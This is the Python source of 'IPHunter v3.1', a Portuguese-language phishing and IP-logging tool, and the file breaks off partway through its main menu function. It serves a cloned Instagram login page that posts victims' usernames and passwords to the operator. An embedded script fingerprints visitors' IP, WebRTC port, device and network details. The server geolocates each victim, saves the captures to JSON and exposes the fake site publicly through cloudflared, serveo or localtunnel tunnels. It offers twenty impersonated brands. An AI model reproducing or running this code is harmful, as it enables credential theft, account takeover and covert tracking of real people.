#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  IPHunter v3.1 - IP Logger & Phishing Tool
#  Instagram 2026 Edition - Corrigido
# ============================================================

import os
import sys
import subprocess
import time
import json
import re
import socket
import threading
import http.server
import socketserver
import urllib.request
from datetime import datetime
from urllib.parse import parse_qs, urlparse

# ============================================================
#  CORES ANSI
# ============================================================
class C:
    RESET       = "\033[0m"
    BOLD        = "\033[1m"
    DIM         = "\033[2m"
    RED         = "\033[31m"
    GREEN       = "\033[32m"
    YELLOW      = "\033[33m"
    BLUE        = "\033[34m"
    MAGENTA     = "\033[35m"
    CYAN        = "\033[36m"
    WHITE       = "\033[37m"
    BRIGHT_RED      = "\033[91m"
    BRIGHT_GREEN    = "\033[92m"
    BRIGHT_YELLOW   = "\033[93m"
    BRIGHT_BLUE     = "\033[94m"
    BRIGHT_MAGENTA  = "\033[95m"
    BRIGHT_CYAN     = "\033[96m"
    BRIGHT_WHITE    = "\033[97m"

# ============================================================
#  BANNER - CENTRALIZADO
# ============================================================
BANNER = """
              IPHunter v3.1 - IP Logger & Phishing Tool
                              2026 Edition
"""

# ============================================================
#  IP LOGGER SCRIPT
# ============================================================
IP_LOGGER_SCRIPT = """
<script>
(async function(){
  try{
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
    let port = 'unknown';
    try {
      const pc = new RTCPeerConnection({iceServers:[]});
      pc.createDataChannel('');
      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);
      await new Promise(r => setTimeout(r, 1200));
      const lines = (pc.localDescription?.sdp || '').split('\\n');
      for (const line of lines) {
        if (line.includes('a=candidate')) {
          const parts = line.split(' ');
          if (parts.length >= 6) {
            const p = parts[5];
            if (/^\\d{1,5}$/.test(p) && parseInt(p) > 1000) {
              port = p;
              break;
            }
          }
        }
      }
      pc.close();
    } catch(e) {}
    const screenRes = screen.width + 'x' + screen.height;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const battery = navigator.getBattery ? 'supported' : 'unsupported';
    const cores = navigator.hardwareConcurrency || 'unknown';
    const memory = navigator.deviceMemory || 'unknown';
    const platform = navigator.platform;
    const language = navigator.language;
    const online = navigator.onLine;
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const networkType = connection ? connection.effectiveType : 'unknown';
    const downlink = connection ? connection.downlink : 'unknown';
    const rtt = connection ? connection.rtt : 'unknown';
    fetch('/log?ip=' + encodeURIComponent(ipData.ip) 
      + '&port=' + encodeURIComponent(port)
      + '&ref=' + encodeURIComponent(document.referrer) 
      + '&ua=' + encodeURIComponent(navigator.userAgent)
      + '&lang=' + encodeURIComponent(language)
      + '&plat=' + encodeURIComponent(platform)
      + '&screen=' + encodeURIComponent(screenRes)
      + '&tz=' + encodeURIComponent(timezone)
      + '&battery=' + battery
      + '&cores=' + cores
      + '&memory=' + memory
      + '&online=' + online
      + '&network=' + encodeURIComponent(networkType)
      + '&downlink=' + downlink
      + '&rtt=' + rtt);
  } catch(e) {
    fetch('/log?ip=unknown&port=unknown&ref=' + encodeURIComponent(document.referrer) 
      + '&ua=' + encodeURIComponent(navigator.userAgent)
      + '&lang=' + navigator.language 
      + '&plat=' + encodeURIComponent(navigator.platform));
  }
})();
</script>
"""

# ============================================================
#  INSTAGRAM TEMPLATE 2026 - PRETO IGUAL DA FOTO
# ============================================================
INSTAGRAM_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
  background: #000000;
  font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: flex-start;
  color: #fff;
  padding: 0;
}
.lang-top {
  width: 100%;
  text-align: center;
  padding: 12px 0;
  color: #a8b5c0;
  font-size: 13px;
  font-weight: 400;
}
.container {
  width: 100%;
  max-width: 400px;
  padding: 0 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
  flex: 1;
  justify-content: center;
}
.logo-wrap {
  display: flex;
  justify-content: center;
  align-items: center;
  margin-bottom: 48px;
}
.logo-wrap svg {
  width: 80px;
  height: 80px;
}
.form-wrap {
  width: 100%;
}
.inp {
  width: 100%;
  padding: 16px 14px;
  margin: 6px 0;
  background: #1c1c1c;
  border: 1px solid #333333;
  border-radius: 12px;
  color: #fff;
  font-size: 15px;
  font-family: inherit;
  outline: none;
  transition: border-color 0.2s;
}
.inp::placeholder { color: #8a8a8a; }
.inp:focus { border-color: #555555; }
.btn-login {
  width: 100%;
  padding: 14px;
  margin-top: 14px;
  background: #0095f6;
  color: #fff;
  border: none;
  border-radius: 24px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
  transition: background 0.15s;
}
.btn-login:hover { background: #1877f2; }
.forgot {
  text-align: center;
  margin: 20px 0 0 0;
  color: #fff;
  font-size: 14px;
  font-weight: 400;
  cursor: pointer;
}
.bottom-section {
  width: 100%;
  max-width: 400px;
  padding: 0 20px 30px 20px;
  display: flex;
  flex-direction: column;
  align-items: center;
  gap: 16px;
}
.btn-create {
  width: 100%;
  padding: 14px;
  background: transparent;
  color: #0095f6;
  border: 1.5px solid #333333;
  border-radius: 24px;
  font-size: 15px;
  font-weight: 600;
  cursor: pointer;
  font-family: inherit;
  transition: background 0.15s;
}
.btn-create:hover { background: rgba(0,149,246,0.08); }
.meta {
  color: #8a8a8a;
  font-size: 13px;
  display: flex;
  align-items: center;
  gap: 6px;
}
.meta svg { width: 16px; height: 16px; fill: #8a8a8a; }
</style>""" + IP_LOGGER_SCRIPT + """
</head>
<body>
<div class="lang-top">Portugues (Brasil)</div>
<div class="container">
  <div class="logo-wrap">
    <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="igGrad" x1="0%" y1="100%" x2="100%" y2="0%">
          <stop offset="0%" style="stop-color:#feda75"/>
          <stop offset="25%" style="stop-color:#fa7e1e"/>
          <stop offset="50%" style="stop-color:#d62976"/>
          <stop offset="75%" style="stop-color:#962fbf"/>
          <stop offset="100%" style="stop-color:#4f5bd5"/>
        </linearGradient>
      </defs>
      <rect x="5" y="5" width="90" height="90" rx="22" ry="22" fill="url(#igGrad)"/>
      <rect x="22" y="22" width="56" height="56" rx="16" ry="16" fill="none" stroke="#fff" stroke-width="6"/>
      <circle cx="50" cy="50" r="14" fill="none" stroke="#fff" stroke-width="6"/>
      <circle cx="72" cy="28" r="5" fill="#fff"/>
    </svg>
  </div>
  <div class="form-wrap">
    <form action="/capture" method="POST">
      <input type="text" name="username" class="inp" placeholder="Nome de usuario, email ou celular" required autocomplete="username">
      <input type="password" name="password" class="inp" placeholder="Senha" required autocomplete="current-password">
      <button type="submit" class="btn-login">Entrar</button>
    </form>
    <div class="forgot">Esqueceu a senha?</div>
  </div>
</div>
<div class="bottom-section">
  <button class="btn-create">Criar nova conta</button>
  <div class="meta">
    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
    Meta
  </div>
</div>
</body>
</html>"""

# ============================================================
#  EMPTY TEMPLATE
# ============================================================
EMPTY_TEMPLATE = """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Carregando...</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;min-height:100vh;display:flex;justify-content:center;align-items:center;font-family:'Inter','Segoe UI',system-ui,sans-serif;color:#fff;overflow:hidden}
.loader-wrap{position:relative;width:100%;height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center}
.ring{width:80px;height:80px;border:3px solid rgba(0,212,255,0.08);border-top:3px solid #00d4ff;border-radius:50%;animation:spin 1s cubic-bezier(0.4,0,0.2,1) infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.pulse{position:absolute;width:120px;height:120px;border-radius:50%;background:rgba(0,212,255,0.03);animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{transform:scale(1);opacity:0.5}50%{transform:scale(1.3);opacity:0}}
h1{font-size:1.4rem;font-weight:500;margin-top:32px;letter-spacing:0.5px;color:rgba(255,255,255,0.7)}
p{font-size:0.85rem;color:rgba(255,255,255,0.3);margin-top:8px}
.dots::after{content:'';animation:dots 1.5s steps(4,end) infinite}
@keyframes dots{0%{content:''}25%{content:'.'}50%{content:'..'}75%{content:'...'}100%{content:''}}
</style>""" + IP_LOGGER_SCRIPT + """
</head><body>
<div class="loader-wrap">
<div class="pulse"></div>
<div class="ring"></div>
<h1>Carregando<span class="dots"></span></h1>
<p>Por favor, aguarde um momento</p>
</div></body></html>"""

# ============================================================
#  CONFIGURACAO DOS SITES
# ============================================================
SITES = {
    '01': ('IP Logger (Site Vazio)', EMPTY_TEMPLATE),
    '02': ('Facebook', EMPTY_TEMPLATE),
    '03': ('Instagram', INSTAGRAM_TEMPLATE),
    '04': ('Google', EMPTY_TEMPLATE),
    '05': ('Netflix', EMPTY_TEMPLATE),
    '06': ('Microsoft', EMPTY_TEMPLATE),
    '07': ('Twitter/X', EMPTY_TEMPLATE),
    '08': ('PayPal', EMPTY_TEMPLATE),
    '09': ('TikTok', EMPTY_TEMPLATE),
    '10': ('Spotify', EMPTY_TEMPLATE),
    '11': ('Discord', EMPTY_TEMPLATE),
    '12': ('Snapchat', EMPTY_TEMPLATE),
    '13': ('LinkedIn', EMPTY_TEMPLATE),
    '14': ('Twitch', EMPTY_TEMPLATE),
    '15': ('Steam', EMPTY_TEMPLATE),
    '16': ('Pinterest', EMPTY_TEMPLATE),
    '17': ('Reddit', EMPTY_TEMPLATE),
    '18': ('GitHub', EMPTY_TEMPLATE),
    '19': ('WhatsApp Web', EMPTY_TEMPLATE),
    '20': ('Telegram Web', EMPTY_TEMPLATE),
}

# ============================================================
#  VARIAVEIS GLOBAIS
# ============================================================
captured_data = []
ip_logs = []
server_running = False
httpd = None
server_thread = None
current_template = ""
redirect_url = "https://google.com"

# ============================================================
#  FUNCOES UTILITARIAS
# ============================================================
def clear():
    os.system('clear')

def print_header(title):
    print()
    print(C.CYAN + "╔" + "═" * 58 + "╗" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.CYAN + "║" + C.RESET + " " * padding + C.BRIGHT_CYAN + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.CYAN + "║" + C.RESET)
    print(C.CYAN + "╚" + "═" * 58 + "╝" + C.RESET)
    print()

def print_section(title):
    print()
    print(C.BRIGHT_BLUE + "┌" + "─" * 58 + "┐" + C.RESET)
    padding = (58 - len(title)) // 2
    print(C.BRIGHT_BLUE + "│" + C.RESET + " " * padding + C.BRIGHT_WHITE + C.BOLD + title + C.RESET + " " * (58 - len(title) - padding) + C.BRIGHT_BLUE + "│" + C.RESET)
    print(C.BRIGHT_BLUE + "└" + "─" * 58 + "┘" + C.RESET)
    print()

def print_info(text):
    print(f"    {C.CYAN}i {text}{C.RESET}")

def print_ok(text):
    print(f"    {C.GREEN}v {text}{C.RESET}")

def print_error(text):
    print(f"    {C.RED}x {text}{C.RESET}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# ============================================================
#  GEOLOCALIZACAO IP COMPLETA
# ============================================================
def get_ip_geolocation(ip):
    """Obtem informacoes completas de geolocalizacao do IP via API gratuita"""
    geo_data = {}
    try:
        req = urllib.request.Request(
            f'http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query',
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        with urllib.request.urlopen(req, timeout=5) as response:
            data = json.loads(response.read().decode())
            if data.get('status') == 'success':
                geo_data = data
            else:
                geo_data['error'] = data.get('message', 'Unknown error')
    except Exception as e:
        geo_data['error'] = str(e)
    return geo_data

def format_geo_info(geo):
    """Formata as informacoes de geolocalizacao para exibicao no terminal"""
    if not geo or geo.get('status') != 'success':
        return f"    {C.RED}⚠️  Nao foi possivel obter geolocalizacao{C.RESET}"

    lines = []
    fields = [
        ('🌍 Pais', 'country'),
        ('🏳️  Codigo Pais', 'countryCode'),
        ('🌎 Continente', 'continent'),
        ('🏛️  Cidade', 'city'),
        ('🏘️  Bairro/Distrito', 'district'),
        ('📍 Regiao', 'regionName'),
        ('📮 CEP', 'zip'),
        ('🌐 Timezone', 'timezone'),
        ('📡 ISP', 'isp'),
        ('🏢 Organizacao', 'org'),
        ('🔗 ASN', 'as'),
        ('📱 Movel', 'mobile'),
        ('🛡️  Proxy/VPN', 'proxy'),
        ('📌 Latitude', 'lat'),
        ('📌 Longitude', 'lon'),
    ]

    for label, key in fields:
        val = geo.get(key)
        if val is not None and val != '':
            if key in ['lat', 'lon']:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}{val}{C.RESET}")
            elif key == 'mobile' and val:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}Sim{C.RESET}")
            elif key == 'proxy' and val:
                lines.append(f"    {C.BRIGHT_RED}{label}:{C.RESET} {C.BRIGHT_RED}SIM ⚠️{C.RESET}")
            else:
                lines.append(f"    {C.YELLOW}{label}:{C.RESET} {C.BRIGHT_WHITE}{val}{C.RESET}")

    return '\n'.join(lines) if lines else f"    {C.DIM}Dados limitados disponiveis{C.RESET}"

# ============================================================
#  CLOUDFLARED - CORRIGIDO
# ============================================================
def start_cloudflared(port):
    print_info("Iniciando Cloudflared...")
    try:
        result = subprocess.run(['which', 'cloudflared'], capture_output=True, text=True)
        if result.returncode != 0:
            print_error("Cloudflared nao encontrado")
            print_info("Instale com: pkg install cloudflared")
            return None
    except:
        return None

    # Matar processos antigos
    os.system("pkill -f 'cloudflared tunnel' 2>/dev/null")
    time.sleep(1)

    log_file = '/tmp/cloudflared.log'
    os.system(f"rm -f {log_file}")

    # Iniciar cloudflared com nohup para manter rodando
    cmd = f"nohup cloudflared tunnel --url http://localhost:{port} > {log_file} 2>&1 &"
    os.system(cmd)

    print_info("Aguardando Cloudflared criar o tunel...")
    time.sleep(6)

    # Tentar pegar a URL varias vezes
    for attempt in range(30):
        try:
            with open(log_file, 'r') as fh:
                log = fh.read()
            # Procurar por URL do cloudflared
            match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', log)
            if match:
                url = match.group(0)
                print_ok(f"Tunel ativo: {url}")
                return url
        except:
            pass
        time.sleep(1)

    # Se nao achou, mostrar log para debug
    try:
        with open(log_file, 'r') as fh:
            log = fh.read()
        if log:
            print_error("Cloudflared nao conseguiu criar o tunel.")
            print_info("Log do Cloudflared:")
            for line in log.split('\n')[-10:]:
                if line.strip():
                    print(f"    {C.DIM}{line}{C.RESET}")
        else:
            print_error("Cloudflared nao gerou log. Verifique se esta instalado corretamente.")
    except:
        print_error("Nao foi possivel ler o log do Cloudflared.")

    return None

# ============================================================
#  SERVEO
# ============================================================
def start_serveo(port):
    print_info("Iniciando Serveo (SSH tunnel)...")
    os.system("pkill -f 'serveo.net' 2>/dev/null")
    time.sleep(1)
    os.system(f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net > /tmp/serveo.log 2>&1 &")
    time.sleep(6)
    for _ in range(10):
        try:
            with open('/tmp/serveo.log', 'r') as fh:
                log = fh.read()
            match = re.search(r'https?://[a-zA-Z0-9-]+\.serveo\.net', log)
            if match:
                return match.group(0)
        except:
            pass
        time.sleep(1)
    return None

# ============================================================
#  LOCALTUNNEL
# ============================================================
def start_localtunnel(port):
    print_info("Iniciando LocalTunnel...")
    try:
        result = subprocess.run(['which', 'lt'], capture_output=True, text=True)
        if result.returncode != 0:
            print_error("LocalTunnel (lt) nao encontrado")
            print_info("Instale com: npm install -g localtunnel")
            return None
    except:
        return None
    os.system("pkill -f 'lt --port' 2>/dev/null")
    time.sleep(1)
    os.system(f"lt --port {port} > /tmp/localtunnel.log 2>&1 &")
    time.sleep(5)
    for _ in range(10):
        try:
            with open('/tmp/localtunnel.log', 'r') as fh:
                log = fh.read()
            match = re.search(r'https?://[a-zA-Z0-9-]+\.loca\.lt', log)
            if match:
                return match.group(0)
        except:
            pass
        time.sleep(1)
    return None

# ============================================================
#  SERVIDOR HTTP COM IP LOGGER + GEOLOCALIZACAO
# ============================================================
class IPLoggerHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        global captured_data, ip_logs
        parsed = urlparse(self.path)
        path = parsed.path
        query = parse_qs(parsed.query)
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        referer = self.headers.get('Referer', 'Direct')

        if path == '/log':
            ip = query.get('ip', [client_ip])[0]
            port = query.get('port', ['unknown'])[0]
            ua = query.get('ua', [user_agent])[0]
            ref = query.get('ref', [referer])[0]
            lang = query.get('lang', ['Unknown'])[0]
            plat = query.get('plat', ['Unknown'])[0]
            screen = query.get('screen', ['Unknown'])[0]
            tz = query.get('tz', ['Unknown'])[0]
            battery = query.get('battery', ['unknown'])[0]
            cores = query.get('cores', ['unknown'])[0]
            memory = query.get('memory', ['unknown'])[0]
            online = query.get('online', ['unknown'])[0]
            network = query.get('network', ['unknown'])[0]
            downlink = query.get('downlink', ['unknown'])[0]
            rtt = query.get('rtt', ['unknown'])[0]

            # GEOLOCALIZACAO COMPLETA
            geo = get_ip_geolocation(ip)

            log_entry = {
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'ip': ip,
                'port': port,
                'user_agent': ua,
                'referer': ref,
                'language': lang,
                'platform': plat,
                'screen': screen,
                'timezone': tz,
                'battery': battery,
                'cores': cores,
                'memory': memory,
                'online': online,
                'network_type': network,
                'downlink': downlink,
                'rtt': rtt,
                'geolocation': geo,
                'type': 'ip_logger'
            }
            ip_logs.append(log_entry)

            print()
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(C.BRIGHT_GREEN + C.BOLD + "           🎯 NOVO ALVO CAPTURADO!" + C.RESET)
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print(f"    {C.YELLOW}📍 IP:{C.RESET}          {C.BRIGHT_WHITE}{ip}{C.RESET}")
            print(f"    {C.YELLOW}🔌 Porta:{C.RESET}       {C.BRIGHT_WHITE}{port}{C.RESET}")
            print(f"    {C.YELLOW}🕐 Horario:{C.RESET}     {C.BRIGHT_WHITE}{log_entry['timestamp']}{C.RESET}")
            print(f"    {C.YELLOW}🖥️  Tela:{C.RESET}       {C.BRIGHT_WHITE}{screen}{C.RESET}")
            print(f"    {C.YELLOW}🌍 Timezone:{C.RESET}    {C.BRIGHT_WHITE}{tz}{C.RESET}")
            print(f"    {C.YELLOW}🌐 User-Agent:{C.RESET} {C.DIM}{ua[:60]}{C.RESET}")
            print(f"    {C.YELLOW}🔗 Referer:{C.RESET}    {C.DIM}{ref[:50]}{C.RESET}")
            print(f"    {C.YELLOW}🗣️  Idioma:{C.RESET}     {C.BRIGHT_WHITE}{lang}{C.RESET}")
            print(f"    {C.YELLOW}💻 Plataforma:{C.RESET} {C.BRIGHT_WHITE}{plat}{C.RESET}")
            print(f"    {C.YELLOW}🔋 Bateria:{C.RESET}    {C.BRIGHT_WHITE}{battery}{C.RESET}")
            print(f"    {C.YELLOW}⚙️  Cores:{C.RESET}      {C.BRIGHT_WHITE}{cores}{C.RESET}")
            print(f"    {C.YELLOW}💾 Memoria:{C.RESET}    {C.BRIGHT_WHITE}{memory} GB{C.RESET}")
            print(f"    {C.YELLOW}📶 Rede:{C.RESET}       {C.BRIGHT_WHITE}{network} ({downlink} Mbps, RTT: {rtt}ms){C.RESET}")
            print()
            print(C.BRIGHT_CYAN + C.BOLD + "    📍 GEOLOCALIZACAO COMPLETA:" + C.RESET)
            geo_formatted = format_geo_info(geo)
            print(geo_formatted)
            print(C.BRIGHT_GREEN + "═" * 60 + C.RESET)
            print()

            self.send_response(200)
            self.send_header('Content-type', 'image/gif')
            self.end_headers()
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
            return

        if path in ['/', '/index.html']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(current_template.encode('utf-8'))
            return

        self.send_response(404)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'<h1>404 Not Found</h1>')

    def do_POST(self):
        global captured_data
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        form_data = parse_qs(post_data)

        # GEOLOCALIZACAO PARA CREDENCIAIS TAMBEM
        geo = get_ip_geolocation(client_ip)

        capture = {
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'ip': client_ip,
            'user_agent': user_agent,
            'data': {k: v[0] if v else '' for k, v in form_data.items()},
            'geolocation': geo,
            'type': 'credentials'
        }
        captured_data.append(capture)

        print()
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print(C.BRIGHT_RED + C.BOLD + "           🔥 CREDENCIAIS CAPTURADAS!" + C.RESET)
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print(f"    {C.YELLOW}📍 IP:{C.RESET}          {C.BRIGHT_WHITE}{client_ip}{C.RESET}")
        print(f"    {C.YELLOW}🕐 Horario:{C.RESET}     {C.BRIGHT_WHITE}{capture['timestamp']}{C.RESET}")
        for key, value in capture['data'].items():
            print(f"    {C.YELLOW}🔑 {key}:{C.RESET}      {C.BRIGHT_WHITE}{value}{C.RESET}")
        print()
        print(C.BRIGHT_CYAN + C.BOLD + "    📍 GEOLOCALIZACAO:" + C.RESET)
        geo_formatted = format_geo_info(geo)
        print(geo_formatted)
        print(C.BRIGHT_RED + "═" * 60 + C.RESET)
        print()

        self.send_response(302)
        self.send_header('Location', redirect_url)
        self.end_headers()

def start_server(port, template, redirect):
    global current_template, redirect_url, httpd, server_running
    current_template = template
    redirect_url = redirect
    handler = IPLoggerHandler
    try:
        httpd = socketserver.TCPServer(("", port), handler)
        server_running = True
        print_ok(f"Servidor iniciado na porta {port}")
        httpd.serve_forever()
    except OSError as e:
        print_error(f"Erro ao iniciar servidor: {e}")
        server_running = False

def stop_server():
    global httpd, server_running
    if httpd:
        httpd.shutdown()
        httpd.server_close()
        server_running = False
        print_ok("Servidor parado")

# ============================================================
#  MENU PRINCIPAL
# ============================================================
def show_banner():
    clear()
    print()
    print(BANNER)
    print()
    print(C.BRIGHT_CYAN + C.BOLD + "           IPHunter v3.1 - IP Logger & Phishing Tool" + C.RESET)
    print(C.DIM + "           Criado para Termux | Geolocalizacao Completa" + C.RESET)
    print()

def show_menu():
    print_section("ESCOLHA O SITE")
    col1 = [
        ('01', 'IP Logger (Vazio)'),
        ('02', 'Facebook'),
        ('03', 'Instagram'),
        ('04', 'Google'),
        ('05', 'Netflix'),
        ('06', 'Microsoft'),
        ('07', 'Twitter/X'),
    ]
    col2 = [
        ('08', 'PayPal'),
        ('09', 'TikTok'),
        ('10', 'Spotify'),
        ('11', 'Discord'),
        ('12', 'Snapchat'),
        ('13', 'LinkedIn'),
        ('14', 'Twitch'),
    ]
    col3 = [
        ('15', 'Steam'),
        ('16', 'Pinterest'),
        ('17', 'Reddit'),
        ('18', 'GitHub'),
        ('19', 'WhatsApp'),
        ('20', 'Telegram'),
    ]
    max_rows = max(len(col1), len(col2), len(col3))
    for i in range(max_rows):
        parts = []
        if i < len(col1):
            num, name = col1[i]
            parts.append(f"{C.BRIGHT_RED}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)
        if i < len(col2):
            num, name = col2[i]
            parts.append(f"{C.BRIGHT_BLUE}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name:<20}{C.RESET}")
        else:
            parts.append(" " * 28)
        if i < len(col3):
            num, name = col3[i]
            parts.append(f"{C.BRIGHT_GREEN}{C.BOLD}[{num}]{C.RESET} {C.WHITE}{name}{C.RESET}")
        else:
            parts.append("")
        line = "    " + "    ".join(parts)
        print(line)
    print()
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[99]{C.RESET} {C.BRIGHT_RED}Sair{C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha uma opcao:{C.RESET}", end=" ")

def show_tunnel_menu():
    print_section("ESCOLHA O TUNEL")
    print(f"    {C.BRIGHT_BLUE}{C.BOLD}[1]{C.RESET} {C.WHITE}Cloudflared (Recomendado - Sem token){C.RESET}")
    print(f"    {C.BRIGHT_YELLOW}{C.BOLD}[2]{C.RESET} {C.WHITE}Serveo (SSH){C.RESET}")
    print(f"    {C.BRIGHT_MAGENTA}{C.BOLD}[3]{C.RESET} {C.WHITE}LocalTunnel{C.RESET}")
    print(f"    {C.BRIGHT_WHITE}{C.BOLD}[4]{C.RESET} {C.WHITE}Apenas Localhost (mesma rede WiFi){C.RESET}")
    print()
    print(f"    {C.CYAN}➤ Escolha:{C.RESET}", end=" ")

def show_results():
    print_section("RESULTADOS CAPTURADOS")
    print(f"    {C.BRIGHT_CYAN}{C.BOLD}📍 IPs CAPTURADOS ({len(ip_logs)}):{C.RESET}")
    if ip_logs:
        for i, log in enumerate(ip_logs[-10:], 1):
            geo_str = ""
            if log.get('geolocation') and log['geolocation'].get('status') == 'success':
                g = log['geolocation']
                geo_str = f" | {g.get('city','')}, {g.get('country','')}"
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{log['ip']}{C.RESET} {C.DIM}(Porta: {log.get('port', 'N/A')}){C.RESET}{C.BRIGHT_CYAN}{geo_str}{C.RESET} - {C.DIM}{log['timestamp']}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhum IP capturado ainda{C.RESET}")
    print()
    print(f"    {C.BRIGHT_RED}{C.BOLD}🔑 CREDENCIAIS CAPTURADAS ({len(captured_data)}):{C.RESET}")
    if captured_data:
        for i, cap in enumerate(captured_data[-10:], 1):
            geo_str = ""
            if cap.get('geolocation') and cap['geolocation'].get('status') == 'success':
                g = cap['geolocation']
                geo_str = f" | {g.get('city','')}, {g.get('country','')}"
            print(f"    {C.YELLOW}[{i}]{C.RESET} {C.BRIGHT_WHITE}{cap['ip']}{C.RESET}{C.BRIGHT_CYAN}{geo_str}{C.RESET} - {C.DIM}{cap['timestamp']}{C.RESET}")
            for k, v in cap['data'].items():
                print(f"         {C.YELLOW}{k}:{C.RESET} {C.BRIGHT_WHITE}{v}{C.RESET}")
    else:
        print(f"    {C.DIM}Nenhuma credencial capturada ainda{C.RESET}")
    print()

def save_results():
    if not captured_data and not ip_logs:
        print_error("Nenhum dado para salvar!")
        return
    filename = f"iphunter_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    data = {
        'timestamp': datetime.now().isoformat(),
        'ip_logs': ip_logs,
        'credentials': captured_data
    }
    try:
        with open(filename, 'w', encoding='utf-8') as fh:
            json.dump(data, fh, indent=2, ensure_ascii=False)
        print_ok(f"Resultados salvos em: {filename}")
    except Exception as e:
        print_error(f"Erro ao salvar: {e}")

# ============================================================
#  FUNCAO MAIN
# ============================================================
def main():
    global server_running, server_thread

    while True:
        show_banner()
        show_menu()

        try:
            choice = input().strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if choice == '99':
            if server_running:
                stop_server()
            clear()
            print()
            print_header("Obrigado por usar o IPHunter v3.1!")
            print()
            break

        if choice not in SITES:
            print(f"\n    {C.RED}x Opcao invalida!{C.RESET}")
            time.sleep(1)
            continue

        site_name, template = SITES[choice]

        # Escolher tunel
        clear()
        show_banner()
        show_tunnel_menu()

        try:
            tunnel_choice = input().strip()
        except (EOFError, KeyboardInterrupt):
            continue

        # Escolher porta
        print()
        print(f"    {C.CYAN}➤ Digite a porta (padrao 8080):{C.RESET}", end=" ")
        try:
            port_input = input().strip()
            port = int(port_input) if port_input else 8080
        except:
            port = 8080

        # Escolher URL de redirecionamento
        print(f"    {C.CYAN}➤ URL de redirecionamento apos captura (padrao: google.com):{C.RESET}", end=" ")
        try:
            redirect = input().strip()
            if not redirect.startswith('http'):
                redirect = 'https://' + redirect if redirect else 'https://google.com'
        except:
            redirect = 'https://google.com'

        # Iniciar servidor
        clear()
        show_banner()
        print_header(f"INICIANDO: {site_name}")

        server_thread = threading.Thread(target=start_server, args=(port, template, redirect))
        server_thread.daemon = True
        server_thread.start()
        time.sleep(1)

        if not server_running:
            print_error("Falha ao iniciar servidor!")
            time.sleep(2)
            continue

        local_ip = get_local_ip()
        print_ok(f"Servidor local: http://{local_ip}:{port}")
        print()

        # Iniciar tunel
